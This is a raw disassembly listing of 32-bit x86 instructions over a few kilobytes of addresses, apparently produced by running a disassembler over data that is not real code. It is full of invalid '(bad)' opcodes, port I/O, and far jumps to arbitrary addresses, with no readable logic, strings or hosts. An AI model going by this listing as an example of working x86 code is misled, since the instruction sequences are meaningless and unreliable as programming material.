  443bad:	sbb    BYTE PTR [eax+0x5c],cl
  443bb0:	mul    DWORD PTR [eax-0x33]
  443bb3:	mov    ebx,0x9d7d191d
  443bb8:	jmp    0xd6f1:0x32c9e542
  443bbf:	jmp    0x5cffef22
  443bc4:	sbb    al,0x96
  443bc6:	retf   
  443bc7:	dec    ecx
  443bc8:	imul   esp,DWORD PTR [eax+0x69],0xffffffb9
  443bcc:	push   eax
  443bcd:	sub    DWORD PTR [edx-0x113aa843],0x9
  443bd4:	int    0xbd
  443bd6:	jno    0x443b93
  443bd8:	jb     0x443b89
  443bda:	push   edi
  443bdb:	mov    eax,ds:0x5a70c389
  443be0:	pop    ebx
  443be1:	das    
  443be2:	jnp    0x443b88
  443be4:	addr16 pop eax
  443be6:	xchg   esi,eax
  443be7:	(bad)  
  443be8:	xor    edx,ebp
  443bea:	nop
  443beb:	leave  
  443bec:	xlat   BYTE PTR ds:[ebx]
  443bed:	rcr    BYTE PTR [ebx-0x61],0x7a
  443bf1:	cmp    al,0xb2
  443bf3:	mov    eax,0x8f3c3f5e
  443bf8:	push   ecx
  443bf9:	sbb    ch,dh
  443bfb:	jb     0x443c62
  443bfd:	sbb    esp,DWORD PTR [edi]
  443bff:	dec    edi
  443c00:	inc    ecx
  443c01:	test   BYTE PTR [eax],0xa1
  443c04:	or     eax,0xa39cfbf
  443c09:	pop    ebp
  443c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c0b:	into   
  443c0c:	pop    esi
  443c0d:	fnstcw WORD PTR [ecx+ecx*4-0x78c25617]
  443c14:	xor    ah,BYTE PTR [ecx-0x4a]
  443c17:	mov    edx,0x689e2dbe
  443c1c:	or     BYTE PTR [edi-0x41],al
  443c1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443c20:	mov    esi,0x2ca0b000
  443c25:	hlt    
  443c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443c27:	fnstsw WORD PTR [edi]
  443c29:	pusha  
  443c2a:	lds    ecx,FWORD PTR [ebp+0x422c5e5e]
  443c30:	sub    eax,0xc6d55843
  443c35:	pusha  
  443c36:	mov    al,ds:0x141d2111
  443c3b:	mov    ebp,0x1764164e
  443c40:	aaa    
  443c41:	test   DWORD PTR [edx+0x21],0x4d9abc63
  443c48:	(bad)  
  443c49:	cmp    BYTE PTR [ecx+eiz*4+0x72da3fa5],cl
  443c50:	lds    edx,FWORD PTR [eax-0x6ba1eb58]
  443c56:	and    cl,0x10
  443c59:	fadd   st(5),st
  443c5b:	(bad)  
  443c5c:	cmp    al,0x60
  443c5e:	es jne 0x443c5d
  443c61:	xchg   DWORD PTR [esi-0x73],edx
  443c64:	or     eax,DWORD PTR [ecx+0x39]
  443c67:	sub    eax,0xbf27245e
  443c6c:	test   al,0x8a
  443c6e:	test   eax,0xacfb60c6
  443c74:	mov    ecx,0xf989a72e
  443c79:	shr    esi,1
  443c7b:	outs   dx,BYTE PTR ds:[esi]
  443c7c:	lods   eax,DWORD PTR ds:[esi]
  443c7d:	xchg   ecx,eax
  443c7e:	cmc    
  443c7f:	jmp    0xe5ea:0xa16cb154
  443c86:	mov    bh,0xbf
  443c88:	add    ch,cl
  443c8a:	stos   BYTE PTR es:[edi],al
  443c8b:	cmp    BYTE PTR [esi+0x11],bl
  443c8e:	hlt    
  443c8f:	cli    
  443c90:	pop    ebp
  443c91:	imul   ecx,DWORD PTR [esi-0x3f],0x46446103
  443c98:	pushf  
  443c99:	jno    0x443c29
  443c9b:	pop    edi
  443c9c:	fwait
  443c9d:	sub    esi,0xb41472f
  443ca3:	test   eax,0x9085cbda
  443ca8:	call   DWORD PTR [edi+0x5934a191]
  443cae:	mov    dh,0xd6
  443cb0:	ins    DWORD PTR es:[edi],dx
  443cb1:	aaa    
  443cb2:	mov    dh,0x4a
  443cb4:	fbld   TBYTE PTR [eax-0x1b]
  443cb7:	ret    0x3a0f
  443cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443cbb:	jmp    0xede89e0f
  443cc0:	cmp    al,0xad
  443cc2:	fadd   DWORD PTR [ebp+0x5cdda31c]
  443cc8:	push   edx
  443cc9:	and    ah,bl
  443ccb:	and    esi,ebx
  443ccd:	jge    0x443d0c
  443ccf:	jecxz  0x443d44
  443cd1:	add    ch,ch
  443cd3:	mov    eax,ds:0x50bc5a54
  443cd8:	dec    ebx
  443cd9:	sub    ecx,ebx
  443cdb:	and    BYTE PTR [eax+edi*2],ah
  443cde:	shr    DWORD PTR [eax-0x7f],0x62
  443ce2:	mov    eax,es:0x8043bcaf
  443ce8:	es call 0xe0a2db7d
  443cee:	inc    ebp
  443cef:	aaa    
  443cf0:	pop    edx
  443cf1:	pop    ecx
  443cf2:	pop    ebp
  443cf3:	xchg   esp,eax
  443cf4:	je     0x443d5e
  443cf6:	and    ecx,edx
  443cf8:	cmp    BYTE PTR [edi],cl
  443cfa:	in     eax,dx
  443cfb:	mov    ds,WORD PTR [eax+0x53]
  443cfe:	repz scas eax,DWORD PTR es:[edi]
  443d00:	iret   
  443d01:	ret    
  443d02:	and    dl,BYTE PTR [edx-0x22]
  443d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443d06:	(bad)  
  443d07:	je     0x443ce2
  443d09:	jmp    0x7d69de8d
  443d0e:	inc    ecx
  443d0f:	(bad)  
  443d10:	inc    ecx
  443d11:	fs mov WORD PTR cs:[esi+0x7e],ds
  443d16:	push   ebx
  443d17:	jecxz  0x443cdd
  443d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443d1a:	inc    eax
  443d1b:	fild   WORD PTR [ebp+0x61]
  443d1e:	sahf   
  443d1f:	adc    DWORD PTR [esi],0xe902f8d0
  443d25:	call   0xcab6b9d0
  443d2a:	pop    esi
  443d2b:	jmp    0x443d92
  443d2d:	dec    ecx
  443d2e:	popa   
  443d2f:	div    DWORD PTR [eax+0x60]
  443d32:	or     eax,0xdb3150cc
  443d37:	mov    al,ds:0x2443fb68
  443d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443d3d:	push   esp
  443d3e:	inc    esp
  443d3f:	in     eax,0x26
  443d41:	mov    bl,dh
  443d43:	mov    al,ds:0xf3425403
  443d48:	ret    
  443d49:	pop    esi
  443d4a:	(bad)  [eax-0x68ccaa08]
  443d50:	sbb    DWORD PTR [eax+ebp*4-0x2b],ebx
  443d54:	pop    esi
  443d55:	stc    
  443d56:	mov    esp,0xc427900a
  443d5b:	adc    al,BYTE PTR [ebx+0x61]
  443d5e:	iret   
  443d5f:	fild   DWORD PTR [ebx+edi*8]
  443d62:	loope  0x443dd2
  443d64:	popa   
  443d65:	jmp    0xad01f258
  443d6a:	and    BYTE PTR [esi],al
  443d6c:	repz popf 
  443d6e:	xor    DWORD PTR [ecx-0x6ea3a1aa],0xd52e82a3
  443d78:	mov    al,ds:0xdeb67004
  443d7d:	pop    ecx
  443d7e:	les    ecx,FWORD PTR [edi*4+0x61a0b602]
  443d85:	scas   al,BYTE PTR es:[edi]
  443d86:	mov    BYTE PTR [edx],cl
  443d88:	pop    ebp
  443d89:	adc    eax,0x95af1b63
  443d8e:	pop    edi
  443d8f:	or     al,0x9a
  443d91:	dec    edi
  443d92:	push   eax
  443d93:	mov    eax,ds:0xf54986cf
  443d98:	outs   dx,DWORD PTR ds:[esi]
  443d99:	out    0x26,eax
  443d9b:	retf   
  443d9c:	mov    BYTE PTR [ebp-0x12],dl
  443d9f:	dec    ebp
  443da0:	shl    BYTE PTR [ebx-0x57b651f4],1
  443da6:	std    
  443da7:	mov    al,ds:0xeb041a98
  443dac:	icebp  
  443dad:	imul   edi,DWORD PTR [edx],0xa31d5e11
  443db3:	xchg   esp,eax
  443db4:	and    eax,0x5c319cf9
  443db9:	pop    esi
  443dba:	mov    ah,0x37
  443dbc:	ins    BYTE PTR es:[edi],dx
  443dbd:	xchg   ecx,eax
  443dbe:	or     BYTE PTR [eax-0x2a],bl
  443dc1:	test   al,0xb3
  443dc3:	or     DWORD PTR [esi-0x66],ebx
  443dc6:	push   edx
  443dc7:	fwait
  443dc8:	or     ebp,ebx
  443dca:	cld    
  443dcb:	xchg   ebp,eax
  443dcc:	inc    esp
  443dcd:	popa   
  443dce:	out    0x84,al
  443dd0:	cmp    al,0x5a
  443dd2:	inc    eax
  443dd3:	jo     0x443dbe
  443dd5:	popf   
  443dd6:	jmp    0x443e45
  443dd8:	add    al,0x3f
  443dda:	mov    eax,ds:0x8cc8de46
  443ddf:	sbb    DWORD PTR [ebx],edx
  443de1:	mov    bh,0xfa
  443de3:	mov    al,ds:0xcb4e499c
  443de8:	adc    dl,BYTE PTR [ebp+0x116500af]
  443dee:	out    0xe9,eax
  443df0:	int3   
  443df1:	loopne 0x443e2d
  443df3:	sbb    eax,DWORD PTR [edx+0x74]
  443df6:	mul    BYTE PTR [ecx+0x4d37b01a]
  443dfc:	icebp  
  443dfd:	mov    ecx,0x80915540
  443e02:	out    dx,al
  443e03:	pop    es
  443e04:	lods   al,BYTE PTR ds:[esi]
  443e05:	push   esp
  443e06:	sbb    DWORD PTR [ebx+0x14],0xe2a19f79
  443e0d:	jl     0x443e7f
  443e0f:	mov    WORD PTR [edx-0x36],es
  443e12:	les    ebx,FWORD PTR [ebx-0xd19a0cc]
  443e18:	pop    esi
  443e19:	and    al,0x2d
  443e1b:	xor    DWORD PTR [ecx+0x1f57e276],0x61
  443e22:	inc    esi
  443e23:	xor    eax,edx
  443e25:	rcr    DWORD PTR [ebp+0x17],0x92
  443e29:	pop    ss
  443e2a:	out    dx,al
  443e2b:	jge    0x443e73
  443e2d:	xor    esi,DWORD PTR [esi+0x6f]
  443e30:	dec    BYTE PTR [ebx]
  443e32:	dec    ecx
  443e33:	mov    eax,ds:0xbb96c4fd
  443e38:	and    BYTE PTR [ebp+0x1c],al
  443e3b:	lods   eax,DWORD PTR ds:[esi]
  443e3c:	pop    esi
  443e3d:	mov    DWORD PTR [ecx],esi
  443e3f:	dec    edx
  443e40:	pop    ecx
  443e41:	addr16 aas 
  443e43:	mov    ecx,0x9d7c6113
  443e48:	daa    
  443e49:	repnz scas eax,DWORD PTR es:[edi]
  443e4b:	loope  0x443de7
  443e4d:	xchg   esi,eax
  443e4e:	data16 adc ah,BYTE PTR [esi+esi*1+0x55]
  443e53:	inc    esp
  443e54:	mov    cl,0xe0
  443e56:	inc    edx
  443e57:	mov    ah,0xd8
  443e59:	ret    0xa176
  443e5c:	xchg   ebx,eax
  443e5d:	not    BYTE PTR [edi]
  443e5f:	stc    
  443e60:	or     bl,ah
  443e62:	lock sbb BYTE PTR [esi+0x3f],0x81
  443e67:	add    DWORD PTR [ebx],esi
  443e69:	inc    ebp
  443e6a:	hlt    
  443e6b:	or     ebx,ecx
  443e6d:	pusha  
  443e6e:	pop    esp
  443e6f:	jp     0x443e64
  443e71:	cwde   
  443e72:	test   ch,ch
  443e74:	aam    0xdb
  443e76:	out    0xde,eax
  443e78:	shl    ch,cl
  443e7a:	pop    es
  443e7b:	pop    ebp
  443e7c:	sbb    edx,DWORD PTR [ecx-0x14437c72]
  443e82:	jg     0x443e25
  443e84:	daa    
  443e85:	add    ah,BYTE PTR [eax]
  443e87:	pushf  
  443e88:	cli    
  443e89:	jmp    0xdc8b3ff
  443e8e:	push   edx
  443e8f:	loopne 0x443eef
  443e91:	jns    0x443f03
  443e93:	xlat   BYTE PTR ds:[ebx]
  443e94:	xchg   ecx,eax
  443e95:	dec    ecx
  443e96:	add    al,0xf6
  443e98:	in     al,dx
  443e99:	lods   al,BYTE PTR ds:[esi]
  443e9a:	cli    
  443e9b:	mov    al,ds:0x9b546e60
  443ea0:	push   cs
  443ea1:	fs xor eax,0x72ea5e3c
  443ea7:	mov    ch,0x3c
  443ea9:	inc    ecx
  443eaa:	call   0x5246:0xb1609170
  443eb1:	div    ecx
  443eb3:	leave  
  443eb4:	pop    esp
  443eb5:	mov    cl,0xee
  443eb7:	pop    ss
  443eb8:	sbb    esi,eax
  443eba:	dec    edx
  443ebb:	xchg   ecx,eax
  443ebc:	inc    ebx
  443ebd:	int3   
  443ebe:	fldcw  WORD PTR [ecx+esi*2+0xdc36e45]
  443ec5:	cdq    
  443ec6:	sub    DWORD PTR [edx-0x31],ecx
  443ec9:	mov    esi,gs
  443ecb:	test   ah,0xa9
  443ece:	xlat   BYTE PTR ds:[ebx]
  443ecf:	sbb    BYTE PTR [edx],dl
  443ed1:	xchg   ebx,eax
  443ed2:	adc    ah,BYTE PTR [ecx-0x6abec618]
  443ed8:	sbb    ebx,DWORD PTR [edi-0x5d]
  443edb:	pusha  
  443edc:	push   ss
  443edd:	xor    DWORD PTR [esi+0x7d357a0],ebp
  443ee3:	out    0xc2,eax
  443ee5:	int3   
  443ee6:	mov    dl,0xa0
  443ee8:	jb     0x443ec1
  443eea:	in     eax,0x85
  443eec:	and    ebx,DWORD PTR [esi-0x21a14168]
  443ef2:	jge    0x443eed
  443ef4:	xchg   ecx,eax
  443ef5:	scas   al,BYTE PTR es:[edi]
  443ef6:	int    0x87
  443ef8:	push   ebp
  443ef9:	popa   
  443efa:	mov    ax,0x1457
  443efe:	(bad)  
  443eff:	lods   al,BYTE PTR ds:[esi]
  443f00:	jb     0x443ec2
  443f02:	jmp    0x443e9a
  443f04:	aaa    
  443f05:	call   0xa94b6c35
  443f0a:	or     eax,DWORD PTR [ebp+0x203e5983]
  443f10:	pusha  
  443f11:	out    dx,eax
  443f12:	push   ebp
  443f13:	rol    DWORD PTR [esi+0x5e4a0465],0x86
  443f1a:	in     eax,0xdf
  443f1c:	outs   dx,DWORD PTR ds:[esi]
  443f1d:	inc    edx
  443f1e:	sbb    edi,DWORD PTR [esi-0x792abac8]
  443f24:	cmp    eax,0x69e17f03
  443f29:	jnp    0x443f9b
  443f2b:	inc    esp
  443f2c:	aaa    
  443f2d:	mov    cl,0xee
  443f2f:	(bad)  
  443f30:	popf   
  443f31:	out    0xd0,eax
  443f33:	test   al,0x83
  443f35:	jbe    0x443f6d
  443f37:	mov    eax,ds:0x8742f5
  443f3c:	adc    edi,0xb85ed640
  443f42:	mov    dl,0xfd
  443f44:	lahf   
  443f45:	cs fcmovnu st,st(0)
  443f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443f49:	pusha  
  443f4a:	mov    ebp,0x14793988
  443f4f:	cmp    eax,0xf8eea05f
  443f54:	test   BYTE PTR [eax-0x637f67d5],ah
  443f5a:	js     0x443f53
  443f5c:	aas    
  443f5d:	popa   
  443f5e:	addr16 into 
  443f60:	dec    ebp
  443f61:	pop    esp
  443f62:	outs   dx,DWORD PTR ds:[esi]
  443f63:	out    dx,eax
  443f64:	dec    edi
  443f65:	sub    dh,ch
  443f67:	fcmovbe st,st(2)
  443f69:	and    dl,ah
  443f6b:	mov    bh,0xda
  443f6d:	add    DWORD PTR [edx-0x3e7cd25f],edx
  443f73:	nop
  443f74:	fstp   QWORD PTR [esi]
  443f76:	daa    
  443f77:	pop    edx
  443f78:	into   
  443f79:	push   ss
  443f7a:	add    DWORD PTR [edi],edi
  443f7c:	jns    0x443f77
  443f7e:	in     eax,dx
  443f7f:	adc    eax,edx
  443f81:	mov    ah,BYTE PTR [esi]
  443f83:	push   0xffffffa2
  443f85:	cli    
  443f86:	(bad)  [eax-0x51c915f7]
  443f8c:	push   cs
  443f8d:	dec    ebp
  443f8e:	arpl   WORD PTR [ebx+0x52],bx
  443f91:	hlt    
  443f92:	adc    BYTE PTR [edi],ch
  443f94:	retf   
  443f95:	add    esi,ebp
  443f97:	jmp    0x443fce
  443f99:	dec    edx
  443f9a:	retf   0x4ff2
  443f9d:	pop    esi
  443f9e:	add    edx,DWORD PTR [eax-0x36c16161]
  443fa4:	mov    ch,0x0
  443fa6:	pop    ecx
  443fa7:	jne    0x443f2a
  443fa9:	imul   ebp,esi,0x56
  443fac:	or     DWORD PTR [esi],ebp
  443fae:	mov    edx,0x3b50e32
  443fb3:	mov    eax,ds:0x8fb3fbc2
  443fb8:	or     al,0x6a
  443fba:	test   DWORD PTR [eax-0x50ba85a5],ebp
  443fc0:	jle    0x443f5d
  443fc2:	fmulp  st(1),st
  443fc4:	xchg   cl,ah
  443fc6:	shl    BYTE PTR [eax-0x67d697f],0x9b
  443fcd:	aad    0x65
  443fcf:	fcomp  QWORD PTR [esi-0x5b]
  443fd2:	push   eax
  443fd3:	pop    ss
  443fd4:	cmp    DWORD PTR [edi],esp
  443fd6:	inc    ebp
  443fd7:	scas   al,BYTE PTR es:[edi]
  443fd8:	popf   
  443fd9:	push   edx
  443fda:	sahf   
  443fdb:	aaa    
  443fdc:	jp     0x444047
  443fde:	jge    0x36c61fe2
  443fe4:	pusha  
  443fe5:	mov    dh,0xee
  443fe7:	and    bl,bl
  443fe9:	sub    DWORD PTR ss:[ebx+0x3e],esi
  443fed:	data16 aad 0xa0
  443ff0:	stc    
  443ff1:	push   es
  443ff2:	test   al,0x33
  443ff4:	test   al,0x16
  443ff6:	push   ds
  443ff7:	jp     0x443fec
  443ff9:	mov    bl,0xee
  443ffb:	imul   ecx,DWORD PTR [ecx+0x6d],0x5b6b419f
  444002:	cdq    
  444003:	adc    DWORD PTR [eax-0x211028a0],esi
  444009:	es call 0x4d27:0xee81d7ef
  444011:	pusha  
  444012:	cwde   
  444013:	or     DWORD PTR [esi-0x7d5eaaa4],ebx
  444019:	iret   
  44401a:	mov    ds,WORD PTR [ebp-0x7a]
  44401d:	(bad)  
  44401e:	pop    ss
  44401f:	out    0xef,al
  444021:	lods   al,BYTE PTR ds:[esi]
  444022:	out    dx,al
  444023:	mov    ecx,0x7678ef1f
  444028:	and    ebx,DWORD PTR [ebx+0x6730a86b]
  44402e:	(bad)  
  44402f:	popf   
  444030:	aaa    
  444031:	int3   
  444032:	ins    BYTE PTR es:[edi],dx
  444033:	popa   
  444034:	fs jg  0x444039
  444037:	sbb    BYTE PTR [esi-0x76],bl
  44403a:	xchg   DWORD PTR [ebx-0x3f],esp
  44403d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44403e:	pushf  
  44403f:	in     al,0xe1
  444041:	das    
  444042:	pop    ebx
  444043:	mov    eax,ds:0xa71d9e00
  444048:	dec    edx
  444049:	imul   BYTE PTR [edx+0x4ea45ff4]
  44404f:	dec    esp
  444050:	imul   ebp,DWORD PTR [ebx+0x30],0x5ec03839
  444057:	adc    esi,edx
  444059:	lods   al,BYTE PTR ds:[esi]
  44405a:	adc    al,0xef
  44405c:	xlat   BYTE PTR ds:[ebx]
  44405d:	pusha  
  44405e:	dec    edx
  44405f:	push   ds
  444060:	adc    ecx,esp
  444062:	ja     0x444018
  444064:	imul   DWORD PTR ds:0x1fde89ee
  44406a:	jne    0x4440cc
  44406c:	adc    eax,0x2b9073fa
  444071:	xchg   ecx,eax
  444072:	xchg   BYTE PTR [edx],ch
  444074:	fimul  WORD PTR [edi]
  444076:	sub    DWORD PTR [eax+0x31],edx
  444079:	cmp    ah,dh
  44407b:	cld    
  44407c:	and    ah,0xef
  44407f:	(bad)
  444083:	and    BYTE PTR [ecx-0x68],dh
  444086:	mov    BYTE PTR [edx],bl
  444088:	cld    
  444089:	push   ecx
  44408a:	dec    esp
  44408b:	and    bh,BYTE PTR [edx]
  44408d:	dec    esp
  44408e:	dec    esi
  44408f:	scas   al,BYTE PTR es:[edi]
  444090:	sar    ecx,0xbf
  444093:	shl    bh,0xef
  444096:	sahf   
  444097:	fs pop esi
  444099:	sbb    cl,0x75
  44409c:	shr    dh,1
  44409e:	jg     0x44402b
  4440a0:	jmp    DWORD PTR [ecx-0x2]
  4440a3:	or     dh,bl
  4440a5:	add    eax,0xd2b9eca2
  4440aa:	cmp    edi,DWORD PTR [ebx+0x5b]
  4440ad:	lds    edx,FWORD PTR [ecx+0x1c]
  4440b0:	mov    eax,ds:0xfee4f748
  4440b5:	jno    0x4440de
  4440b7:	jno    0x444106
  4440b9:	popa   
  4440ba:	jmp    DWORD PTR [eax-0x23]
  4440bd:	sub    dl,BYTE PTR ds:0x12fe3f78
  4440c3:	fstp   DWORD PTR [edx+0x40b3eec7]
  4440c9:	dec    eax
  4440ca:	ror    bl,1
  4440cc:	push   es
  4440cd:	popa   
  4440ce:	call   0xbbbc:0x7780fa1a
  4440d5:	adc    ch,dh
  4440d7:	mov    dh,0xab
  4440d9:	or     al,BYTE PTR [edx+0x4d035cd8]
  4440df:	mov    eax,ds:0xf0c73d88
  4440e4:	in     al,0x52
  4440e6:	mov    edi,0xda985ea1
  4440eb:	loop   0x444094
  4440ed:	push   ecx
  4440ee:	dec    edi
  4440ef:	adc    al,0xc1
  4440f1:	pop    edi
  4440f2:	jae    0x4440e1
  4440f4:	mov    esp,0x6bb083dc
  4440f9:	lods   eax,DWORD PTR ds:[esi]
  4440fa:	pop    esi
  4440fb:	icebp  
  4440fc:	mov    ebp,0x28dd02d2
  444101:	out    0xae,eax
  444103:	dec    edi
  444104:	loope  0x444098
  444106:	or     DWORD PTR [esi-0x1f1e9ef7],0x4560abae
  444110:	in     eax,0x8b
  444112:	out    dx,al
  444113:	cs dec eax
  444115:	mov    ebx,0x1f847e58
  44411a:	cdq    
  44411b:	sub    DWORD PTR ds:0xdd0c1245,edi
  444121:	in     eax,0xee
  444123:	leave  
  444124:	fist   DWORD PTR [edi-0x19b0ae9d]
  44412a:	sahf   
  44412b:	cwde   
  44412c:	pop    edi
  44412d:	dec    ebp
  44412e:	int    0xe
  444130:	mov    bh,al
  444132:	sbb    eax,0xb63b8249
  444137:	mov    al,ds:0x8c076a9
  44413c:	int3   
  44413d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44413e:	popf   
  44413f:	pop    edi
  444140:	pop    esi
  444141:	push   ss
  444142:	or     al,0xba
  444144:	add    al,0xf3
  444146:	scas   al,BYTE PTR es:[edi]
  444147:	mov    ebx,0xc6075f6d
  44414c:	or     cl,BYTE PTR [eax+0x3]
  44414f:	outs   dx,DWORD PTR ds:[esi]
  444150:	sbb    esi,DWORD PTR [ecx+0x6c]
  444153:	(bad)  
  444154:	pop    esi
  444155:	xor    dl,BYTE PTR [edi+0xcb53db4]
  44415b:	inc    esi
  44415c:	and    BYTE PTR [eax-0x60],0xfb
  444160:	xchg   ebp,eax
  444161:	mov    bh,0x5b
  444163:	pop    ecx
  444164:	fiadd  WORD PTR [eax]
  444166:	out    dx,eax
  444167:	add    bh,dl
  444169:	call   0x2ec576fa
  44416e:	lea    esp,[edx+esi*1+0x42dc249a]
  444175:	and    DWORD PTR [esi+0x51],ebx
  444178:	jns    0x444123
  44417a:	add    bh,BYTE PTR [ebx]
  44417c:	jo     0x4441b9
  44417e:	scas   al,BYTE PTR es:[edi]
  44417f:	ins    BYTE PTR es:[edi],dx
  444180:	mov    ds:0xd5f31b49,al
  444185:	pop    esp
  444186:	test   al,0x58
  444188:	pop    es
  444189:	sbb    bh,BYTE PTR [ecx+eiz*1+0x25]
  44418d:	fwait
  44418e:	inc    eax
  44418f:	and    BYTE PTR [ebx-0x79],bl
  444192:	mov    ds:0x2ede7c44,al
  444197:	lds    esp,FWORD PTR [esi-0x645ec4b1]
  44419d:	popa   
  44419e:	push   cs
  44419f:	cs scas eax,DWORD PTR es:[edi]
  4441a1:	cmp    DWORD PTR [edx-0x61],eax
  4441a4:	scas   al,BYTE PTR es:[edi]
  4441a5:	push   eax
  4441a6:	out    dx,al
  4441a7:	in     al,dx
  4441a8:	arpl   WORD PTR [ecx+esi*8],sp
  4441ab:	jge    0x44415f
  4441ad:	xor    BYTE PTR [ecx+eiz*4],al
  4441b0:	mov    ebp,0xfe76e933
  4441b5:	xlat   BYTE PTR ds:[ebx]
  4441b6:	push   ebp
  4441b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4441b8:	xchg   ch,ah
  4441ba:	out    dx,al
  4441bb:	ss aam 0xf7
  4441be:	mov    dl,0x5b
  4441c0:	mov    cl,0x4f
  4441c2:	shl    ah,0xff
  4441c5:	daa    
  4441c6:	cmp    BYTE PTR [ecx-0x502f6d77],ah
  4441cc:	aad    0x9d
  4441ce:	and    al,0x67
  4441d0:	pop    esi
  4441d1:	push   edi
  4441d2:	popf   
  4441d3:	(bad)
  4441d6:	cld    
  4441d7:	in     eax,0x8c
  4441d9:	pusha  
  4441da:	push   0xffffffcf
  4441dc:	xchg   edi,eax
  4441dd:	pop    esi
  4441de:	loopne 0x4441a5
  4441e0:	das    
  4441e1:	scas   eax,DWORD PTR es:[edi]
  4441e2:	call   0x6248a4a2
  4441e7:	jb     0x44424f
  4441e9:	pop    eax
  4441ea:	popa   
  4441eb:	leave  
  4441ec:	and    ah,BYTE PTR [eax]
  4441ee:	outs   dx,BYTE PTR ds:[esi]
  4441ef:	repnz push ebp
  4441f1:	xchg   edi,eax
  4441f2:	or     al,0x3d
  4441f4:	pop    ebx
  4441f5:	xor    BYTE PTR [ecx-0x4],ch
  4441f8:	mov    cl,0xe2
  4441fa:	xor    BYTE PTR [ebx+0x3b],al
  4441fd:	test   DWORD PTR [ebx+0x24785281],ecx
  444203:	mov    eax,ds:0x4d9e6f0
  444208:	push   ss
  444209:	push   es
  44420a:	xchg   edi,eax
  44420b:	pop    esp
  44420c:	pop    esi
  44420d:	xchg   ecx,eax
  44420e:	cmc    
  44420f:	jp     0x4441d2
  444211:	jno    0x4441de
  444213:	(bad)  
  444214:	sbb    DWORD PTR [esi-0x3b],esp
  444217:	pop    esp
  444218:	(bad)  
  444219:	out    0x68,eax
  44421b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44421c:	test   eax,0xe260fc42
  444221:	mov    bh,0xb9
  444223:	fldz   
  444225:	and    al,0xee
  444227:	jg     0x4441f6
  444229:	not    BYTE PTR [ecx+0x7c]
  44422c:	js     0x444236
  44422e:	daa    
  44422f:	mov    eax,ds:0xfd749c41
  444234:	inc    ebx
  444235:	(bad)  
  444236:	repnz das 
  444238:	inc    BYTE PTR [esi+ecx*2]
  44423b:	jno    0x4442a6
  44423d:	in     eax,dx
  44423e:	in     eax,0xa0
  444240:	push   esi
  444241:	dec    ebx
  444242:	add    bh,BYTE PTR [edi]
  444244:	loope  0x444256
  444246:	enter  0x5efc,0x4a
  44424a:	fnstsw WORD PTR [esi+0x1bc7f779]
  444250:	dec    edi
  444251:	cs stos DWORD PTR es:[edi],eax
  444253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444254:	adc    edi,edx
  444256:	dec    edi
  444257:	hlt    
  444258:	xchg   edx,eax
  444259:	mov    al,0x56
  44425b:	je     0x4442b6
  44425d:	xchg   esi,eax
  44425e:	out    dx,al
  44425f:	fst    st(5)
  444261:	repnz inc edi
  444263:	push   ds
  444264:	xchg   ebx,eax
  444265:	jmp    0xbdb0:0x5ddfa196
  44426c:	lahf   
  44426d:	add    DWORD PTR [eax-0x31],0x5e
  444271:	loope  0x44421d
  444273:	and    ch,BYTE PTR [edi+0x321b9ccd]
  444279:	jge    0x444232
  44427b:	out    0xa9,eax
  44427d:	pusha  
  44427e:	xor    esi,DWORD PTR [ebp-0x76]
  444281:	(bad)  
  444282:	ins    DWORD PTR es:[edi],dx
  444283:	inc    edx
  444284:	pop    esi
  444285:	aam    0x99
  444287:	fild   WORD PTR [ebx-0x8]
  44428a:	iret   
  44428b:	and    eax,0xf33160f1
  444290:	mov    bl,0xb3
  444292:	xor    ecx,DWORD PTR [ebx]
  444294:	sahf   
  444295:	addr16 out dx,al
  444297:	lock call FWORD PTR [eax]
  44429a:	cmp    al,0xa6
  44429c:	jae    0x44423d
  44429e:	jo     0x44422e
  4442a0:	rol    BYTE PTR [ebx+0x776a2103],cl
  4442a6:	inc    ebp
  4442a7:	lods   al,BYTE PTR es:[esi]
  4442a9:	loop   0x4442a2
  4442ab:	sbb    eax,0xf8ee4497
  4442b0:	lock xor bl,BYTE PTR [esi-0x7a]
  4442b4:	cdq    
  4442b5:	pusha  
  4442b6:	imul   ecx,DWORD PTR [ebx+ecx*8],0xffffffaf
  4442ba:	push   0xc2591763
  4442bf:	mov    bl,0xd8
  4442c1:	and    esi,ebp
  4442c3:	pop    ebp
  4442c4:	stc    
  4442c5:	or     edx,0x7c310332
  4442cb:	mov    eax,ds:0x1fda74ac
  4442d0:	push   0xfffffffb
  4442d2:	(bad)  
  4442d3:	int    0x52
  4442d5:	outs   dx,BYTE PTR ds:[esi]
  4442d6:	retf   
  4442d7:	xchg   ebp,eax
  4442d8:	popf   
  4442d9:	popa   
  4442da:	push   DWORD PTR [ecx]
  4442dc:	hlt    
  4442dd:	sub    BYTE PTR [edx],dh
  4442df:	jbe    0x4442ab
  4442e1:	pusha  
  4442e2:	ins    BYTE PTR es:[edi],dx
  4442e3:	int    0x5c
  4442e5:	mov    ch,0x89
  4442e7:	fidivr WORD PTR [edi+eiz*1-0x12]
  4442eb:	jmp    0x6891:0x18580958
  4442f2:	xor    DWORD PTR [ecx+0x50baa0fa],esp
  4442f8:	adc    DWORD PTR ds:0xed5ec2d7,edx
  4442fe:	dec    esp
  4442ff:	pushf  
  444300:	gs jmp 0x89e:0x60bd5823
  444308:	mov    ecx,0xcceb39e7
  44430d:	jle    0x444309
  44430f:	iret   
  444310:	fwait
  444311:	cs popa 
  444313:	xchg   ebx,eax
  444314:	mov    eax,0x6ba49f9f
  444319:	and    al,0x1c
  44431b:	fs out 0xfe,al
  44431e:	test   DWORD PTR [edx],ebp
  444320:	pop    esi
  444321:	jae    0x4442ba
  444323:	mov    dh,0x57
  444325:	std    
  444326:	xchg   edx,eax
  444327:	shr    DWORD PTR [ebp+0x26],1
  44432a:	xor    DWORD PTR [edx-0x3fe46d91],esp
